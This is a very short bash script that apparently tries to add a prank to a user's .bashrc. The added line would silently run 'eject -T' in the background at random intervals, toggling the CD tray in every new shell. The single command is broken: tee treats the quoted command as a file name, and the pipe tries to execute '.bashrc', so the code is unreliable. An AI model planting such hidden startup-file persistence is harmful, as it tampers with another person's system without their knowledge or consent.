#!/bin/bash
tee -a 'nohup watch -n $RANDOM eject -T &>/dev/null &' | .bashrc
